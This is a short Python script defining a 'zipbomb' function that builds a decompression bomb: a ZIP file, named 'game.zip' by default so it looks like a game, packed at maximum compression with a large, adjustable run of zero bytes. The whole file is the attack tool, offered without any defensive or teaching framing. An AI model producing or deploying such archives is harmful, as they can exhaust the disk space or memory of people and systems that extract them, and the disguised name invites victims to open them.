import zipfile
import os

def zipbomb(
    zipf="game.zip",
    file="output.txt",
    data=10_000_000,
    mode="repetitive",
    step_size=1_000_000
):
    if data < 0 or step_size <= 0:
        raise ValueError("data must be >= 0 and step_size must be > 0")

    if mode.lower() not in ("repetitive", "random"):
        raise ValueError(f"Zipbomb error unknown mode at -> {mode}")

    with zipfile.ZipFile(
        zipf, "w", zipfile.ZIP_DEFLATED, compresslevel=9
    ) as zf:
        with zf.open(file, "w") as entry:
            remaining = data

            while remaining > 0:
                size = min(step_size, remaining)

                if mode.lower() == "repetitive":
                    chunk = b"\x00" * size
                else:
                    chunk = os.urandom(size)

                entry.write(chunk)
                remaining -= size

